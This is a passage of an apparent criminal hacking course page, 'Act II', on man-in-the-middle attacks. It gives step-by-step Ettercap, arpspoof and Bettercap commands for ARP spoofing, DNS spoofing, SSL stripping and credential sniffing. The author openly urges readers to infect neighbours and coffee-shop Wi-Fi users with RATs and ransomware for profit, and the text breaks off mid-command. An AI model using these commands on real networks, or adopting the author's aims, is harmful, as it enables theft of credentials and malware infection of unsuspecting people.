@@ -1,0 +1,1657 @@
+<head>
+ <title>
+  Act II
+ </title>
+ <meta content="application/xhtml+xml; charset=utf-8" http-equiv="content-type"/>
+ <link href="../1.ico" rel="shortcut icon" type="image/x-icon"/>
+ <link href="../css/style.css" media="screen" rel="stylesheet" type="text/css">
+ </link>
+</head>
+<body>
+ <div class="wrap background">
+  <div id="logo">
+   <div class="clear">
+   </div>
+   <div id="left">
+    <center>
+     <h1>
+      <a href="../2.html">
+       <font color="White">
+        Act II
+       </font>
+      </a>
+     </h1>
+     <h2>
+      <font color="black">
+       Network and MITM attacks
+      </font>
+     </h2>
+    </center>
+    <p class="subtitle">
+     Who's DAT Man-In-The-Middle (MITM)
+    </p>
+    <br/>
+    <center>
+     <font color="blue">
+      <b>
+       If you just want the MITM tool syntax click
+       <a href="Syntax.html" target="_blank">
+        here
+       </a>
+      </b>
+     </font>
+     <br/>
+     <br/>
+    </center>
+    There will be points throughout this course marked in
+    <font color="blue">
+     <b>
+      BLUE
+     </b>
+    </font>
+    .
+    These points are useful to fully grasp the concepts taught and help with understanding techniques and explanations on various topics. It's important that when you read them you stop and take the time to do what they say or follow up with them. The syntax of code to be typed into Terminal or the command line will be
+    <font color="red">
+     <b>
+      RED
+     </b>
+    </font>
+    . So anytime you see something in
+    <font color="red">
+     <b>
+      RED
+     </b>
+    </font>
+    you know that it's syntax code and should be entered into Kali, Terminal, Windows command line, etc.
+    <br/>
+    <br/>
+    I'm going to rant for a second and I hope this rant triggers some ideas in people and maybe even change some people's mindsets on what type of targets to focus on. Everyone wants to spread malware, adware, RAT, ransomware, etc. to everyone and their mother so they can make millions from selling their accounts, deploying ransomware, etc. but..... if you tailor your attacks to specific targets that of are interest to you whether financially, politically, hacktivist shit, etc. to your goals then do that. I'm sure you've read about some people making millions from their ransomware projects, etc. but the reality is this isn't going to be you. You just don't have the technical capability to code your own nor the IT infrastructure required behind it but you have the smarts to buy your own off the shelf RAT, ransomware, or otherwise. Think globally but act locally is the best way to remain undetected and under the radar. Again, don't aim for millions of compromised computers. Aim for hundreds or at best thousands of infected computers. Think smaller scale like targeting the people around you, your neighbours in your building, the houses around the coffee shops you frequent or the libraries you sit at. Aim to infect 100's of people not a 1,000,000.
+    <br/>
+    <br/>
+    Aim to make hundreds a month first, then thousands and up!. Slow and steady brothers.
+    <br/>
+    <br/>
+    It's always best to target people that you know the most about and what you know best is your own environment. This means you know how the people around you act online and what cyber security the "average" individual has in order to tailor your attacks for the crowd and increase your chance of success. Plus local knowledge will help leverage that information to assist in you compromising people/organizations in order to obtain their credentials, computers, accounts, etc. that you want.
+    <br/>
+    <br/>
+    Tailored attacks designed for a specific individual or group have a much greater chance of being successful then randomly spraying malware to people across the globe through email. Spreading your malware through spam emails is a good way of getting any malware/ransomware rendered useless, detected, and a malware researcher confusing your malware campaign with an APT group. Whatever man. If you're doing this at least buy a recently hacked email list from a reputable vendor or hack into the organization yourself and spread it that way. Depends where your skills are at I guess.
+    <br/>
+    <br/>
+    Let's get into it. Our goal is to put ourselves between the data coming and going from the network so we're able to sniff the traffic for any juicy tidbits of information like account credentials, bank logins, credit card, session IDs, etc. However, capturing any of that juicy information isn't going to happen these days because of everything we just talked about in the last chapter. Now you're probably thinking WTF man how am I going to steal peoples shit and get rich bitch?! Well you're going to do that by educating yourself on the current state of affairs and sharpening your claws by reading the courses offered at HacKtown and getting the fuck up to speed on the current hacker landscape. Don't fucking be angry about shit that worked years ago and you were asleep at the fucking wheel trying to learn old stuff. This is 2020 get with the times and learn to be better. Read the fuck on son.
+    <br/>
+    <br/>
+    Back in the day we could sniff the network traffic and discover tons of logins, credit cards, etc. as anything that went over the wire (the network) was in plaintext, which was a lot back then, was ours for the taking. Since HTTPS and HSTS has been implemented all of that has hindered such activities greatly. The chance of you getting any of that information now would be to launch a MITM attack, having the victim try and visit a non HSTS site with HTTPS, and "downgrade" them to HTTP so you're able to collect their data being sent over the network. Also, you would need the victim to click through all those fucking warnings like a retard and enter their shit so you can capture it. No modern-day banks or financial institutions allow any of that shit to happen for obvious reasons. Companies and organizations learn from hacker tradecraft and being hacked themselves which beefs up their IT security, naturally, coming in-line with modern cyber defenses against mother fuckers like us.
+    <br/>
+    <br/>
+    We use MITM attacks now and days to either infect the victims with malware, hook their browsers with BeEF, use the Social-Engineering-Toolkit (SET), or similar phishing tools. The goal with our MITM attacks is to either target the whole network or a specific individual/IP and fuck their whole internet connection up leading them to our malicious trap. The reality is it's very unlikely that MITM attacks against people visiting HTTPS websites will work today as we've come to learn in the previous chapter. Unless of course, people are blindly clicking through warnings and are visiting non-HSTS websites.
+    <br/>
+    <br/>
+    <font color="blue">
+     <b>
+      QUICK RE-CAP
+     </b>
+     <br/>
+     We know that when launching a MITM attack against people on the same network as you against HSTS enabled websites the victims cannot have visited the HTTPS site ever in the past and the website is not in the HSTS file. This is where people get all fucked up and hung up. This is why launching MITM is difficult these days. How often do you think that when you're launching a MITM attack against the network someone is going to randomly show up, connect to the Wi-Fi at the coffee shop, library, or place of business, and login to a website they've never been to before? Do you think this will have any value? Also, even if that did happen, which isn't fucking likely, you would require the victim to click through the HTTPS warnings, and login to whatever web portal you're after. Fuck that. You'll waste days thinking you'll capture anything. If you don't believe me once you've learned this shit go try it somewhere and be amazed...with nothing.
+     <br/>
+     <br/>
+    </font>
+    The harsh reality is you're
+    <u>
+     not
+    </u>
+    going to capture any credentials, cookies, or otherwise as those days are long gone. Our goals when it comes to MITM attacks on the network is infecting people with malware as waiting for anything else simply won't happen. We want to focus our efforts on infecting them rather than trying to sniff HTTPS traffic all fucking day with no positive results. Fuck that idiots. We need to adjust our attacks and realize the best thing for us is to compromise people on the network, gain control over their machine to pillage passwords, install malware, install ransomware, or whatever we can monetize. We want to be up to date with our attacks and focus on what works. There is also phishing but just hold the fuck up for ACT IV which is going to be released FALL/WINTER 2020. Check website for updated courses for members.
+    <br/>
+    <br/>
+    There are a few methods which I've found to be very effective. These methods are not %100 successful as there are many variables when it comes to success but for the sake of this course I'm going to teach you what type of attacks leverage the most amount of success and if your goal was to siphon Facebook logins like a savage wait for the phishing course coming out. Again, tipping me for my work is appreciated and gives me motivation to create more guides. $20, $40, $400,000, anything will be appreciated and keep me writing these for your greedy paws. Let's get into it comrades.
+    <br/>
+    <br/>
+    In order to fully understand MITM attacks we're going to go through the old tools right up to the newest tools used today so you can see the functionality of each of them. For the examples used our attacker computer is running Kali in a VM. It's always recommended to use a fresh install of Kali when experimenting with these tools especially when you're testing things out for the first time. We'll be targeting another laptop on the network and it's best to target your host machine for these. Your setup should be the same to ensure everything will function properly.
+    <br/>
+    <br/>
+    <font color="blue">
+     <b>
+      I highly recommend restarting your Kali machine after launching each tool and before using the next tool or use a fresh install each time.
+      <br/>
+      <br/>
+     </b>
+    </font>
+    Before we get into the first tooled called Ettercap there are some last key points you should know about these MITM tools and MITM in general. While testing with the Ettercap tool you'll find it doesn't work properly as most HTTPS websites won't load properly, can't display the webpage, require the victim to reload the page multiple times, sometimes displays a certificate error/warning, and consistently didn't re-direct victims to our web server. With those problems it's not really the greatest tool to be using since it didn't consistently do what was expected, thus we can't rely on this tool. A better tool was released in the past couple of years that has replaced Ettercap which is known as Bettercap, which we'll discuss next after Ettercap. Ettercap uses a tool called SSLStrip to "downgrade" HTTPS to HTTP. I use "downgrade" as a simple term so don't blow your mind.
+    <br/>
+    <br/>
+    If you're already familiar with MITM attacks then you should be well aware of SSLStrip. SSLStrip and its variations are used during a MITM attack in a variety of tools. It's important to understand what SSLStrip does because it's doing the magic in the background when you're trying to re-direct people trying to view HTTPS websites. We'll talk about this technique in general terms.
+    <br/>
+    <br/>
+    SSLStrip has been around for a while and has had some modifications done to the original script since it was released to improve it.
+    <br/>
+    <br/>
+    "SSL stripping is a technique introduced by Moxie Marlinspike during BlackHat in 2009. It will transparently hijack HTTP traffic on a network, watch for HTTPS links and redirects, then map those links into either look-alike HTTP links or homograph-similar HTTPS links.
+    <br/>
+    <br/>
+    Long story short, this technique will replace every
+    <u>
+     HTTPS
+    </u>
+    link in the HTML source code of the webpage the target is browsing with
+    <u>
+     HTTP
+    </u>
+    links. For example, if you visit a webpage and right click with your mouse on the webpage then select "View Source" you would be able to view the HTML source code of that website. It would normally have some HTML code that would look like:
+    <br/>
+    <br/>
+    ... &lt;a href="
+    <font color="orange">
+     <b>
+      https
+     </b>
+    </font>
+    ://www.facebook.com/"&gt;Login&lt;/a&gt; ...
+    <br/>
+    <br/>
+    During a SSL stripping attack the HTML code will be modified as:
+    <br/>
+    ... &lt;a href="
+    <font color="orange">
+     <b>
+      http
+     </b>
+    </font>
+    ://www.facebook.com/"&gt;Login&lt;/a&gt; ...
+    <br/>
+    <br/>
+    See how it changed the links from "
+    <font color="orange">
+     <b>
+      https
+     </b>
+    </font>
+    " to "
+    <font color="orange">
+     <b>
+      http
+     </b>
+    </font>
+    ". Being the man in the middle, this allows us to sniff HTTP web traffic and modify pages that normally we wouldn't be able to even see. Since we've "downgraded" HTTPS links to HTTP we know HTTP is in cleartext so we'll be able to grab their credentials. Yes!
+    <br/>
+    <br/>
+    However, HSTS came into play stopping the above attacks and for most who didn't know about HSTS and are trying to learn MITM attacks from YouTube, hacking forums, etc. your efforts would have failed. Probably blaming others for your attacks not working but not realizing why.
+    <br/>
+    <br/>
+    HSTS is one of the reasons Leonardo Nve Egea presented SSLStrip+ ( or sslstrip2 ) during BlackHat Asia 2014. This tool was an improvement over the original Moxie's version SSLStrip, specifically created to bypass HSTS policies. Since HSTS rules most of the time are applied on a per-hostname basis, the trick is to downgrade HTTPS links to HTTP and to prepend some custom sub domain name to them. Every resulting link won't be valid for any DNS server but since we're performing a MITM attack we can resolve these hostnames anyway.
+    <br/>
+    <br/>
+    Let's take the previous example page:
+    <br/>
+    ... &lt;a href="
+    <font color="orange">
+     <b>
+      https://www
+     </b>
+    </font>
+    .facebook.com/"&gt;Login&lt;/a&gt; ...
+    <br/>
+    <br/>
+    A HSTS bypass attack will change it to something like:
+    <br/>
+    ... &lt;a href="
+    <font color="orange">
+     <b>
+      http://wwww
+     </b>
+    </font>
+    .facebook.com/"&gt;Login&lt;/a&gt; ...
+    <br/>
+    <br/>
+    Notice that "
+    <font color="orange">
+     <b>
+      https
+     </b>
+    </font>
+    " has been downgraded to "
+    <b>
+     <font color="orange">
+      http
+     </font>
+    </b>
+    " and "
+    <b>
+     <font color="orange">
+      www
+     </font>
+    </b>
+    " replaced with "
+    <b>
+     <font color="orange">
+      wwww
+     </font>
+    </b>
+    ".
+    <br/>
+    <br/>
+    When the "victim" clicks on a link on the webpage, no HSTS rule will be applied (since there are no rules for such a subdomain that was just created for wwww.facebook.com) and the MITM tool used (BetterCap in this case since Ettercap only uses the original SSLStrip and not SSLStrip+) will take care of the DNS resolution, allowing us to see and alter the traffic we weren't supposed to see. Got it?
+    <br/>
+    <br/>
+    OK to recap if we're trying to visit https://www.webpage.com the newest SSLStrip+ will strip the contents and try and make the request to https://wwww.webpage.com. Since https://wwww.webpage.com is a page the target hasn't been to before and is not a HSTS website you're able to MITM "downgrade" their HTTPS to HTTP.
+    <br/>
+    <br/>
+    Even the Bettercap creator agrees the original SSLStrip was buggy and did not function reliably especially since HSTS has been implemented.
+    <br/>
+    <br/>
+    <center>
+     <img height="150" src="../images2/39.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    Remember, we are able to launch a MITM against HTTPS/HTTP websites but we cannot intercept anything HSTS related.
+    <br/>
+    <br/>
+    <font color="blue">
+     <h3>
+      We've already talked about it but it's VERY important to remember that:
+     </h3>
+     <li>
+      Most MITM programs use SSLStrip/SSLstrip+ to intercept HTTPS data by "downgrading" them to HTTP.
+     </li>
+     <li>
+      SSLStrip+ will work against TLS and SSL if HSTS is not used.
+     </li>
+     <li>
+      SSLStrip+ will work on anything that does not have HSTS preloaded.
+     </li>
+     <li>
+      SSLStrip+ will only work on non-preloaded HSTS websites.
+     </li>
+     <li>
+      We can intercept HTTPS non-HSTS websites but users are presented with multiple warnings before visiting the desired website.
+     </li>
+     <li>
+      We cannot MITM anything HSTS related (FaceBook, Twitter, IG, etc.).
+     </li>
+    </font>
+    <br/>
+    <br/>
+    These are important to know and understand the limitations of your MITM attacks because when you're launching them and not getting %100 success the above factors will hinder your efforts. However, there's nothing anyone can do as defenses against these attacks have now been put into place preventing most of them from succeeding.
+    <br/>
+    <br/>
+    You're now caught up with the state of MITM attacks. You're either disappointed with the harsh reality or have learned some valuable tips to help you succeed in the future. Let' get into it.
+    <br/>
+    <br/>
+    <h3>
+     <font color="blue">
+      For best results:
+     </font>
+    </h3>
+    <li>
+     An attacker computer running Kali VM or directly from USB or as the host OS.
+    </li>
+    <li>
+     A separate computer to be the target (Updated Windows or macOS preferably).
+    </li>
+    <li>
+     Attacker and Target computer/laptops connected to the same home network as you with internet connectivity.
+    </li>
+    <li>
+     USe fresh Kali VM for each tool example if possible.
+    </li>
+    <br/>
+    <br/>
+    Ensure you installed the pre-requisites.
+    <br/>
+    <br/>
+    In Terminal on Kali:
+    <br/>
+    <font color="red">
+     <b>
+      sudo apt-get update &amp;&amp; sudo apt-get install gedit bettercap dsniff driftnet python3-pip python-pip python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file -y &amp;&amp; sudo apt autoremove -y
+     </b>
+    </font>
+    <br/>
+    <br/>
+    <font color="blue">
+     <b>
+      NOTE
+     </b>
+    </font>
+    <br/>
+    In some examples below you'll be advised to visit  websites when testing MITM attacks in a "New Private Window". Each modern web browser should have a New Private Window feature under "File - New Private Window". I highly advise to load the example websites in a "New Private Window" to ensure you're not loading a cache version of the website to and it's a fresh load of the website each time. Please ensure you're doing this to avoid being displayed a cache version of the website and thinking the attacks are not working when indeed they are. If you don't know how to open a "New Private Window" then guess what? Google that shit.
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <center>
+     <h1>
+      MITM Tools
+     </h1>
+    </center>
+    <h3>
+     <font color="green">
+      <b>
+       Ettercap
+      </b>
+     </font>
+    </h3>
+    Ettercap worked well but can be unstable when used on larger networks, seemed to stop working at random, didn't have some built in features that newer programs have today, and simply is an old tool. Not to knock it all it's just not maintained and there are newer tools that perform much better.
+    <br/>
+    <br/>
+    Before we use Ettercap we need to make some modifications to the Ettercap config files.
+    <br/>
+    <br/>
+    In Kali open Terminal and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo gedit /etc/ettercap/etter.conf
+     </b>
+    </font>
+    <center>
+     <img height="600" src="../images2/34.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    <br/>
+    On line 16 and 17 in the screenshot below change the ec_uid and ec_gid from 65534 to 0.
+    <br/>
+    <center>
+     <img height="600" src="../images2/33.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    Next scroll down until you see the Linux iptables section.
+    <center>
+     <img height="200" src="../images2/35.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    Un-comment the iptables section "#redir_command_on..." and "#redir_command_off..." for "iptables" and "IPv6" on lines 184, 185, 188, and 189.
+    <center>
+     <img height="200" src="../images2/36.png" width="700"/>
+     <br/>
+    </center>
+    Save the file and close it.
+    <br/>
+    <br/>
+    Next:
+    <br/>
+    <font color="red">
+     <b>
+      sudo gedit /etc/ettercap/etter.dns
+     </b>
+    </font>
+    <br/>
+    Scroll down until you see "microsoft.com A 107.170.40.56" on line 61.
+    <center>
+     <img height="600" src="../images2/37.png" width="700"/>
+     <br/>
+    </center>
+    <br/>
+    Add "*.com A 192.168.128.100" like in the picture below (except replace 192.168.128.100 with the IP of your Kali machine), save the file, and then close it.
+    <center>
+     <img height="600" src="../images2/38.png" width="700"/>
+     <br/>
+    </center>
+    Adding the "*.com A 192.168.128.100" is telling Ettercap to redirect
+    <u>
+     ALL
+    </u>
+    websites that end in .com to your IP. So when the victim tries to visit any HTTP website they get redirected to your IP/webserver of choice. If for example you just wanted to intercept (1) specific website called http://whatiswhat.com then you would add the following:
+    <br/>
+    "whatiswhat.com A 192.168.128.100"
+    <br/>
+    <br/>
+    Next, once we've edited the config file we want to ensure a webserver is running on our Kali machine. For this example we'll use apache2 which comes installed by default on Kali. Once our web server is up and running we'll use Ettercap to intercept HTTPS requests and attempt to "downgrade" them to HTTP and re-direct all websites to your web server.
+    <br/>
+    <br/>
+    In Kali open up a new Terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo service apache2 restart
+      <br/>
+      sudo ettercap -Tq -P sslstrip -P dns_spoof -M arp -i INTERFACE /TARGET_IP// /ROUTER_IP//
+     </b>
+    </font>
+    <br/>
+    <br/>
+    <i>
+     Example:
+     <br/>
+    </i>
+    I've scanned the network and found a target of interest with an IP of 192.168.2.100, my interface is wlan0, and I've determined the router IP is 192.168.2.1.
+    <br/>
+    <font color="red">
+     <b>
+      sudo ettercap -Tq -P sslstrip -P dns_spoof -M arp -i wlan0 /192.168.2.100// /192.168.2.1//
+     </b>
+    </font>
+    <br/>
+    Note the double "//" is required.
+    <br/>
+    <br/>
+    -T = Text version of Ettercap
+    <br/>
+    -q = Do not display packet contents (helps not fill your screen with too many things)
+    <br/>
+    -P = plugin to use
+    <br/>
+    -M = perform a MITM in the middle attack
+    <br/>
+    -i = Interface to use
+    <br/>
+    <br/>
+    Once you've ran the ettercap command get on your target computer (Windows 7+ or macOS computer) and try browsing to any HTTPS or HTTP websites. Common problems that people encounter is not using their target machine IP in the above command. Make sure it's the right IP of the computer you're targeting on the network. Anything that the target computer visits over HTTP will be re-directed,
+    <i>
+     <u>
+      sometimes
+     </u>
+    </i>
+    , to your web server. If credentials were sent over the wire with HTTP they would be displayed in the same window that Ettercap was launched. Remember, sniffing HTTP credentials now and days isn't reality so don't waste your time thinking you're going to capture anything of value here. This isn't the year 2000 mates.
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    When complete press the letter "
+    <font color="red">
+     <b>
+      q
+     </b>
+    </font>
+    " on your keyboard to shutdown Ettercap properly.
+    <br/>
+    <br/>
+    Make sure you cancel the attacks before moving onto the next tool. In fact it's recommended to restart your machine before moving on.
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      <b>
+       Arpspoof
+      </b>
+     </font>
+    </h3>
+    Arpspoof is a tool that does exactly what the tool name implies. This tool spoofs ARP packets over the network tricking the victim into thinking that you're the router and that they must send their network data to you. Any data that is sent to and from the computer you've ARP spoofed will go through you. This will give you the ability to become the man in the middle and be able to sniff their network Wi-Fi traffic. Remmeber, ARP matches an IP to a MAC address so the router and client knows where to send their network traffic to. We spoof that to trick both into thinking we're the router and that everything should be routed through us.
+    <br/>
+    <br/>
+    This is a good tool and functions well but still has some hiccups. You must arp spoof the data going from the target to the router
+    <b>
+     <u>
+      and
+     </u>
+    </b>
+    from the router to the target. This is why we must run the arpspoof command twice as seen below.
+    <br/>
+    <br/>
+    In this example we're going to intercept the target computers web traffic and display any images that are loaded by them to us and what websites they're visiting.
+    <br/>
+    <br/>
+    In Kali open up a new Terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo sysctl -w net.ipv4.ip_forward=1
+      <br/>
+      sudo arpspoof -i INTERFACE -t TARGET_IP ROUTER_IP
+      <br/>
+     </b>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     <b>
+      sudo arpspoof -i INTERFACE -t ROUTER_IP TARGET_IP
+      <br/>
+     </b>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     <b>
+      sudo driftnet -i INTERFACE -pa
+      <br/>
+     </b>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     <b>
+      sudo urlsnarf -i INTERFACE
+      <br/>
+      <br/>
+     </b>
+    </font>
+    <i>
+     Example:
+    </i>
+    <br/>
+    My interface is eth0, my target IP is 192.168.2.100, and the router IP is 192.168.2.1:
+    <br/>
+    <font color="red">
+     <i>
+      sudo sysctl -w net.ipv4.ip_forward=1
+      <br/>
+      sudo arpspoof -i eth0 192.168.2.100 192.168.2.1
+      <br/>
+     </i>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo arpspoof -i eth0 192.168.2.1 192.168.2.100
+     <br/>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo driftnet -i eth0 -pa
+     <br/>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo urlsnarf -i eth0
+     <br/>
+     <br/>
+    </font>
+    "
+    <b>
+     sysctl -w net.ipv4.ip_forward=1
+    </b>
+    " = Forwards packets from your machine to the internet.
+    <br/>
+    <b>
+     driftnet
+    </b>
+    = is a program that will display all the images the target is viewing over HTTP.
+    <br/>
+    <b>
+     urlsnarf
+    </b>
+    = is a tool that will display all the websites the target is visiting.
+    <br/>
+    <br/>
+    Leave all the windows open. On your target computer open a web browser with a "New Private Window" and visit any
+    <b>
+     HTTP
+    </b>
+    website to see pictures displayed on the website and URLs captured in the driftnet window and urlsnarf window respectively.
+    <br/>
+    <br/>
+    Yes this is all fun and all but this tool doesn't really help us much when it comes to anything malicious per se but it's more so to demonstrate the importance of being able to intercept and capture anything sent over HTTP.
+    <br/>
+    <br/>
+    You should now know that if you're performing MITM attacks then anything that's not encrypted like HTTP you will be able to intercept and read. Whereas anything that's encrypted such as HTTPS or other secure protocols would be useless to you.
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      <b>
+       Bettercap
+      </b>
+     </font>
+    </h3>
+    This is the most modernized tool used today and has so many improvements compared to Ettercap that most modern attackers/professionals utilize this tool for their engagements. There's a lot of functionality and I suggest going through the tool yourself and testing it against multiple devices but for the purpose of this course we're going to focus on the MITM side of things.
+    <br/>
+    <br/>
+    Bettercap can sniff:
+    <br/>
+    <li>
+     URLs being visited.
+    </li>
+    <li>
+     HTTPS hosts being visited.
+    </li>
+    <li>
+     HTTP POSTed data.
+    </li>
+    <li>
+     HTTP Basic and Digest authentications.
+    </li>
+    <li>
+     HTTP Cookies.
+    </li>
+    <li>
+     FTP credentials.
+    </li>
+    <li>
+     IRC credentials.
+    </li>
+    <li>
+     POP, IMAP and SMTP credentials.
+    </li>
+    <li>
+     NTLMv1/v2 ( HTTP, SMB, LDAP, etc ) credentials.
+    </li>
+    <li>
+     DICT Protocol credentials.
+    </li>
+    <li>
+     MPD Credentials.
+    </li>
+    <li>
+     NNTP Credentials.
+    </li>
+    <li>
+     DHCP messages and authentication.
+    </li>
+    <li>
+     REDIS login credentials.
+    </li>
+    <li>
+     RLOGIN credentials.
+    </li>
+    <li>
+     SNPP credentials
+    </li>
+    <br/>
+    <h4>
+     <font color="blue">
+      Intercepting
+      <u>
+       HTTP
+      </u>
+      traffic over the network with Bettercap
+     </font>
+    </h4>
+    In this attack we target an individual on the network and MITM them. Anything that is sent unencrypted we'll be able to intercept and view.
+    <br/>
+    <br/>
+    For the next examples it's advisable should you encounter any issues to boot Kali from USB or have Kali as your main OS. Sometimes using Kali in VM with some MITM attacks may cause problems. You should also have another computer on the same network as your target machine that we'll be targeting to demonstrate bettercap. Try not to test this is in a VM and use real world scenarios.
+    <br/>
+    <br/>
+    My example target computer IP is 192.168.2.100.
+    <br/>
+    <br/>
+    In Kali open up a new Terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo bettercap
+     </b>
+    </font>
+    <br/>
+    All of the following commands below are to be entered into the bettercap window.
+    <br/>
+    <font color="red">
+     <b>
+      net.probe on
+     </b>
+    </font>
+    <br/>
+    Wait 30 seconds for it to discover network hosts.
+    <br/>
+    <font color="red">
+     <b>
+      net.probe off
+      <br/>
+      net.show
+      <br/>
+     </b>
+    </font>
+    This will show you the targets on the network. Pay attention to your target IP.
+    <br/>
+    <font color="red">
+     <b>
+      set http.proxy.sslstrip true
+      <br/>
+      set net.sniff.verbose false
+      <br/>
+      set arp.spoof.targets TARGET_IP
+      <br/>
+     </b>
+    </font>
+    My example:
+    <br/>
+    set arp.spoof.targets 192.168.2.100
+    <br/>
+    <font color="red">
+     <b>
+      net.sniff on
+      <br/>
+      http.proxy on
+      <br/>
+      arp.spoof on
+      <br/>
+      <br/>
+     </b>
+    </font>
+    Leave the bettercap window open. On your target computer open a web browser with a "New Private Window" and visit:
+    <br/>
+    http://login.ebiquity.com
+    <br/>
+    <br/>
+    On the http://login.ebiquity.com website enter "USERNAME" into the username field and "PASSWORD" into the password field and hit ENTER. Once you've submitted those credentials you've probably already noticed a bunch of data scroll by the bettercap terminal window. Take some time to look at the bettercap output carefully and see if you're able to recognize anything of interest there.
+    <br/>
+    <br/>
+    You should have picked out the "USERNAME" and "PASSWORD" out of the data displayed to you in the bettercap window. This is an easy way with bettercap to setup a MITM attack enabling you to sniff any plaintext data over the network. Remember, every website would have a different username and password field so you'd need to use some common sense when figuring out other websites HTTP POST data to see the proper input fields. Using "USERNAME" and "PASSWORD" is a good first way to see the input fields if you're confused on where to look. If you're like WTF was just said?! It's time to learn some HTML and is too basic to explain what HTTP POST data is. You should have at minimum a basic understanding of HTML. This will help you!
+    <br/>
+    <br/>
+    This attack will not interfere with anything HTTPS related so all websites will load properly and the target would be unaware anything is occurring. If any credit card information were to be entered over a HTTP website it would be yours for the taking. But this isn't 2014 so that's not going to happen.
+    <br/>
+    <br/>
+    <h4>
+     <font color="blue">
+      Intercepting
+      <u>
+       HTTPS
+      </u>
+      traffic over the network with Bettercap
+     </font>
+    </h4>
+    In this attack we're going to try and intercept HTTPS data while targeting someone on the network.
+    <br/>
+    <br/>
+    My example target computer IP is 192.168.2.100.
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo bettercap
+     </b>
+    </font>
+    <br/>
+    All the following commands below are to be entered into the bettercap window.
+    <br/>
+    <font color="red">
+     <b>
+      net.probe on
+     </b>
+    </font>
+    <br/>
+    Wait 30 seconds for it to discover network hosts.
+    <br/>
+    <font color="red">
+     <b>
+      net.probe off
+      <br/>
+      net.show
+      <br/>
+     </b>
+    </font>
+    This will show you the targets on the network. Pay attention to your target IP.
+    <br/>
+    <font color="red">
+     <b>
+      set https.proxy.sslstrip true
+      <br/>
+      set net.sniff.verbose false
+      <br/>
+      set arp.spoof.targets TARGET_IP
+      <br/>
+     </b>
+    </font>
+    My example:
+    <br/>
+    set arp.spoof.targets 192.168.2.100
+    <br/>
+    <font color="red">
+     <b>
+      set arp.spoof.internal true
+      <br/>
+      net.sniff on
+      <br/>
+      https.proxy on
+      <br/>
+      arp.spoof on
+      <br/>
+     </b>
+    </font>
+    <br/>
+    Common problems that people encounter here are not entering "https.proxy.sslstrip" and "https.proxy on" properly. Remember to ensure you're entering "https" and not "http".
+    <br/>
+    <br/>
+    On your target computer open a web browser with a "New Private Window" and visit:
+    <br/>
+    https://senglehardt.com/demo/no_boundaries/loginmanager
+    <br/>
+    <br/>
+    Depending on which browser you're using will dictate the HTTPS errors displayed to you. As discussed in the previous chapter these are the warnings that users are presented with when a MITM attack is happening against them. Go ahead and click "Advanced" or similar to click through the warnings and visit https://senglehardt.com/demo/no_boundaries/loginmanager.
+    <br/>
+    <br/>
+    You can appreciate why this would deter some users from clicking through these warnings when displayed to them. Regardless, sniffing HTTPS and trying to find credentials all day on a network is dead so don't focus too much on this. Capturing any type of useful data in today's day and age isn't going to happen in a timely fashion. However, since we know our limitations with MITM attacks and HTTP, HTTPS, and HSTS your ultimate goal should be re-directing everyone on the network to your web server and infect them with malware, RAT, or ransomware. Don't try and capture credentials over the wire. That ain't happening. Besides, depending on what type of ransomware or malware you infect them with you'll be able to siphon their account credentials and monetize that data accordingly by infecting them.
+    <br/>
+    <br/>
+    <div id="HTTP">
+    </div>
+    <h4>
+     <font color="blue">
+      Re-directing
+      <u>
+       HTTP
+      </u>
+      requests to your webserver over the network with Bettercap
+     </font>
+    </h4>
+    In this attack we're going to MITM a target on the network and re-direct their website requests to our own web server.
+    <br/>
+    <br/>
+    For this example we're going to intercept any HTTP requests over the network from the target computer and re-direct them to our website/web server. There are many reasons for doing this and it opens up a wide variety of attack vectors for us to deliver to targets. This obviously depends on where your skill level is but these days you can buy off the shelf malware and with the assistance of the courses released at HackTow you're off to the races in no time! Maybe you have a new drive-by web browser exploit (LOL keep dreaming) or a new phishing page to show them ;)
+    <br/>
+    <br/>
+    Also, depending on where your HTML/CSS/JS skills are at you'll be able to deliver a very professional and extremely effective web template to social engineer users into doing something not in their best interest. For example, if you're on a Starbucks network maybe you'd like to re-direct everyone on that Wi-Fi network to your personal "StarBucks" page and deliver some ransomware right to their faces? Hmm?
+    <br/>
+    <br/>
+    Or maybe you want to re-direct everyone to your own "StarBucks" website to have them download a new rewards application (RAT). You see? Creativity is the key to success.
+    <br/>
+    <br/>
+    For this example:
+    <br/>
+    My attacker computer IP is 192.168.2.233
+    <br/>
+    My target computer IP is 192.168.2.100.
+    <br/>
+    <br/>
+    In Kali open up a new Terminal window and type the following:
+    <br/>
+    <font color="red">
+     <b>
+      sudo service apache2 restart
+      <br/>
+      sudo bettercap
+     </b>
+    </font>
+    <br/>
+    All the following commands below are to be entered into the bettercap window.
+    <br/>
+    <font color="red">
+     <b>
+      net.probe on
+     </b>
+    </font>
+    <br/>
+    Wait 30 seconds for it to discover network hosts.
+    <br/>
+    <font color="red">
+     <b>
+      net.probe off
+      <br/>
+      net.show
+      <br/>
+     </b>
+    </font>
+    This will show you the targets on the network. Pay attention to your target IP.
+    <br/>
+    <font color="red">
+     <b>
+      set http.proxy.sslstrip true
+      <br/>
+      set net.sniff.verbose false
